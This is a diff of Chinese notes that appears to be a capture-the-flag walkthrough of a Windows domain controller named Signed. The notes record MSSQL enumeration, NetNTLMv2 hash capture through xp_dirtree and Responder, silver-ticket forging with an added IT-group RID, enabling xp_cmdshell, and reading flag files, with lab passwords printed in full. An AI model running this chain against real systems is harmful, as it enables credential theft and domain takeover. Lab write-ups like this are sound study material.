@@ -8,7 +8,30 @@
 [★]$ netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth //[+] DC01\scott:Sm230#C5NatH 
 [★]$ mssqlclient.py scott:'Sm230#C5NatH'@dc01.signed.htb
 ————————————————————————————————————————————————————————————————
-[1]尝试列出主机上 SMB 共享中的目录：
+[1]将使用 Impacket 连接mssqlclient.py到MSSQL
+
+[★]$ mssqlclient.py scott:'Sm230#C5NatH'@dc01.signed.htb
+
+SQL (scott  guest@master)> select @@version;  //全局变量@@version显示版本信息
+SQL (scott  guest@master)> select SUSER_SNAME(), ORIGINAL_LOGIN(); //明确地获取有关已登录用户的更多信息
+SQL (scott  guest@master)> select * from fn_my_permissions(NULL, 'SERVER'); //同时检查服务器级和数据库级权限：
+SQL (scott  guest@master)> select * from fn_my_permissions(NULL, 'DATABASE');
+SQL (scott  guest@master)> SELECT  name FROM sys.databases; //查询 sys.databases它是 MSSQL 里专门用来列出所有数据库的系统视图
+SQL (scott  guest@master)> xp_cmdshell whoami //检查以下内容xp_cmdshell
+SQL (scott  guest@master)> enum_impersonate //检查是否存在身份冒用和关联服务器，但这两项检查都没有发现任何异常
+SQL (scott  guest@master)> enum_links
+SQL (scott  guest@master)> select @@SERVERNAME; //该输出确认了当前服务器名称为 DC01，我也可以通过以下命令看到@@SERVERNAME：
+SQL (scott  guest@master)> enum_logins //列出登录名，只有 scott 和 sa（管理员）帐户
+SQL (scott  guest@master)> xp_dirtree "C:\"  //xp_dirtree这将允许我枚举文件系统。我可以尝试读取以下内容C:\
+SQL (scott  guest@master)> SELECT SUSER_SID('SIGNED\Administrator'); //MSSQL 提供了获取域用户信息的机制。例如，我可以查找域管理员帐户的 SID
+SQL (scott  guest@master)> SELECT SUSER_SNAME(0x0105000000000005150000005b7bb0f398aa2245ad4a1ca4f4010000); //也可以反其道而行之
+SQL (scott  guest@master)> SELECT SUSER_SNAME(0x0105000000000005150000005b7bb0f398aa2245ad4a1ca4f5010000); /想查看哪些设备拥有 501 (0xf5010000)，MSSQL 将显示
+————————————————————————————————————————————————————————————————
+[★]$ netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth -M mssql_priv
+MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
+MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH
+————————————————————————————————————————————————————————————————
+[2]尝试列出主机上 SMB 共享中的目录：
 
 SQL (scott  guest@master)> xp_dirtree \\10.10.15.139\share
 subdirectory   depth   file   
@@ -16,27 +39,99 @@ subdirectory   depth   file
 SQL (scott  guest@master)>
 
 [★]$ sudo responder -I tun0 //得到破解 NetNTLMv2 --> MSSQLSVC purPLE9795!@
-                                         __
-  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
-  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
-  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
-                   |__|
-
-           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
-
-
 ————————————————————————————————————————————————————————————————
-[2][★]$ mssqlclient.py mssqlsvc:'purPLE9795!@'@DC01.signed.htb -windows-auth
+[★]$ netexec mssql DC01.signed.htb -u mssqlsvc -p 'purPLE9795!@' 
+MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
+MSSQL       10.129.242.173  1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
+————————————————————————————————————————————————————————————————
+[3][★]$ mssqlclient.py mssqlsvc:'purPLE9795!@'@DC01.signed.htb -windows-auth
 
 SQL (SIGNED\mssqlsvc  guest@master)>
+SQL (SIGNED\mssqlsvc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin'); //此账户并非管理员账户
+    
+-   
+0   
+SQL (SIGNED\mssqlsvc  guest@master)> enum_impersonate //这里存在一些冒充行为，dc_admin 已被授予对 msdb 数据库中 MS_DataCollectorInternalUser 用户的 IMPERSONATE 权限
+execute as   database   permission_name   state_desc   grantee    grantor                        
+----------   --------   ---------------   ----------   --------   ----------------------------   
+b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser
 
-
-[3]将使用 Impacket 连接mssqlclient.py到MSSQL
-
-[★]$ mssqlclient.py scott:'Sm230#C5NatH'@dc01.signed.htb
-
-SQL (scott  guest@master)> select @@version;  //全局变量@@version显示版本信息
+SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
+name                                type_desc       is_disabled   sysadmin     
+SIGNED\IT                           WINDOWS_GROUP             0          1
 ————————————————————————————————————————————————————————————————
+————————————————————————————————————————————————————————————————
+————————————————————————————————————————————————————————————————
+[4]Silver Ticket 银票  | 为了获取 NTLM 密码，我将使用 Python 和明文密码：
+
+[★]$ python3 -c 'import hashlib; print(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).hexdigest())'
+ef699384c3285c54128a3ee1ddb1a0cc
+
+SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\Domain Users'); //从数据库中获取一个 SID                                                              
+-----------------------------------------------------------   
+b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000'
+
+[★]$ python3 //把二进制 SID 转换成标准格式 
+Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 
+>>> from impacket.dcerpc.v5.dtypes import SID
+>>> SID(bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000')).formatCanonical()
+'S-1-5-21-4088429403-1159899800-2753317549-513'
+>>> exit()
+————————————————————————————————————————————————————————————————
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 mssqlsvc
+[★]$ KRB5CCNAME=mssqlsvc.ccache mssqlclient.py -no-pass -k DC01.signed.htb
+
+SQL (SIGNED\Administrator  guest@master)> select SUSER_SNAME(), ORIGINAL_LOGIN(); //是以 mssqlsvc 用户身份：TGS 作为管理员 [失败]                                          
+-------------------   -------------------   
+SIGNED.HTB\mssqlsvc   SIGNED.HTB\mssqlsvc   
+————————————————————————————————————————————————————————————————
+以管理员身份创建工单：
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 Administrator
+[★]$ KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k DC01.signed.htb
+
+SQL (SIGNED\Administrator  guest@master)> select SUSER_SNAME(), ORIGINAL_LOGIN(); //数据库的设置使得管理员用户没有任何有用的权限                                                 
+------------------------   ------------------------   
+SIGNED.HTB\Administrator   SIGNED.HTB\Administrator   
+————————————————————————————————————————————————————————————————
+————————————————————————————————————————————————————————————————
+————————————————————————————————————————————————————————————————
+[5]TGS with IT Group
+
+SQL (SIGNED\Administrator  guest@master)> select SUSER_SID('Signed\IT')                                                             
+-----------------------------------------------------------   
+b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'   
+
+[★]$ python3 -c 'print(0x451)'
+1105
+
+# hex → decimal
+python3 -c 'print(0x451)'
+
+# decimal → hex
+python3 -c 'print(hex(1105))'
+————————————————————————————————————————————————————————————————
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
+[★]$ KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k DC01.signed.htb
+SQL (SIGNED\Administrator  dbo@master)> //它立即显示用户为 dbo，而不是 guest
+SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
+
+SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell whoami
+output            
+---------------   
+signed\mssqlsvc   
+SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "type C:\Users\mssqlsvc\Desktop\user.txt"
+
+SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "whoami /groups" 
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288//高完整性（High Integrity）服务上下文|但是OPENROWSET使用BULK关键字可以读取使用这些组的文件                                                                                                 
+SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
+BulkColumn                                
+---------------------------------------   
+b'cbfcf88****************************\r\n'   
+
+————————————————————————————————————————————————————————————————
+[6]另外
 //SIGNED\mssqlsvc  dbo@master --> -user-id 1103 -groups '512,1105' doesntmatter
 
 [★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -user-id 1103 -groups '512,1105' doesntmatter
@@ -256,7 +351,7 @@ SIGNED\Guest
 ```
 #### SUSER_SNAME 函数作用把 SID（二进制）转换成“用户名”
 #### 域：SIGNED 用户：Guest | SID 枚举 / 用户识别（User Enumeration via SID）
-#### netexec它提供了一个--rid-brute可以删除用户的选项：是不行的，
+#### netexec它提供了一个--rid-brute可以删除用户的选项：是不行的，换成-M mssql_priv
 ```
 [★]$ netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth -M mssql_priv
 MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
@@ -461,7 +556,8 @@ Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its af
 ```
 #### 可以用它连接到 MSSQL：
 ```
-[★]$ KRB5CCNAME=mssqlsvc.ccache mssqlclient.py -no-pass -k DC01.signed.htbImpacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+[★]$ KRB5CCNAME=mssqlsvc.ccache mssqlclient.py -no-pass -k DC01.signed.htb
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Encryption required, switching to TLS
 [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
